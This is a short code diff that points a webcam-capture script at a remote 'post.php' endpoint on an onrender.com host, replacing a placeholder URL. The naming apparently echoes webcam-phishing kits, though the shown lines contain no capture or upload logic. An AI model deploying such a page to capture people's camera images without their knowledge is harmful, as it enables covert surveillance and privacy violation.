@@ -2,7 +2,7 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 
-const BACKEND_URL = "https://TON-SERVICE.onrender.com/post.php";
+const BACKEND_URL = "https://saychesse-do-home.onrender.com//post.php";
 
 async function startWebcam() {
     const stream = await navigator.mediaDevices.getUserMedia({
